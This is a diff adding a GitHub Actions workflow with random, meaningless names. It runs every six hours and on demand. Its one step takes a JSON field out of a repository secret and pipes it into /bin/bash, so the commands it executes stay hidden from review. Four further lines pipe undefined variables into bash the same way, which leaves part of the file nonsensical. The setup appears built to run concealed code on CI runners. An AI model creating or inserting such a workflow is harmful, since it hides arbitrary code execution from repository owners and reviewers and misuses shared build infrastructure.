@@ -1,0 +1,22 @@
+name: yanshadouxingsanshi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanshadouxingsanshi
+        env:
+          evket924: ${{ secrets.evket924 }}
+        run: |
+          echo $evket924 | jq -r .ubwu4574 | /bin/bash
+          echo $o294 | jq -r .qv0 | /bin/bash
+          echo $ahhgy86 | jq -r .p3 | /bin/bash
+          echo $d26 | jq -r .qay88 | /bin/bash
+          echo $cahbi78872 | jq -r .iz63921 | /bin/bash
+
